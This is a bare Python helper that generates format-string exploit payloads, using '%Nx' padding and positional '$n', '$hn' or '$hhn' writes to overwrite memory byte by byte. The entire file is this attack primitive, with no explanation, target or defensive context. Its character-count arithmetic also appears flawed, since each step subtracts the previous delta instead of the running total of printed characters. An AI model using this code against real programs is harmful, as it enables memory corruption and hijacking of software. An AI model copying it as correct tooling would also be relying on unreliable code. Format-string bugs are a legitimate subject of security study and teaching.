import sys
import os

def fsb(bit, width, offset, data, padding, roop):
	payload = ""
	write_num = 0 
	s = "$n"
	mask = 0xffffffff
	if width == 1:
		s = "$hhn"
		mask = 0xff
	elif width == 2:
		s = "$hn"
		mask = 0xffff
	elif width == 4:
		s = "$n"
		mask = 0xffffffff
	
	for i in range(0, roop):
		write_num = (((data >> (i*8*width)) & mask) - write_num - padding)
		if write_num < 0:
			write_num += (1 << width*8)
		payload += "%"
		payload += str(write_num)
		payload += "x%"
		payload += str(offset+i)
		payload += s
		
	return payload

